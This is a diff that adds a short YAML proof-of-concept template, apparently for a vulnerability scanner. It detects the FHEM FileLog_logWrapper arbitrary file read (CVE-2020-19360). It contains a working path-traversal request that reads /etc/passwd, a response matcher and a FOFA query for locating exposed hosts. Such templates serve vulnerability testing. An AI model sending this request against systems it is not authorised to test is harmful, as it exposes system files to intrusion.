@@ -1,0 +1,16 @@
+id: poc-yaml-fhem-filelog-logwrapper-anyfile-read
+info:
+  name: Fhem FileLog_logWrapper 任意文件读取漏洞(CVE-2020-19360)
+  severity: high
+  tags:
+  - CVE-2020-19360
+  - 任意文件或目录访问
+  finger: fhem
+  fofa: title=="Home, Sweet Home"
+requests:
+- method: GET
+  path: /fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"Save config")
+variables: {}
+transport: http
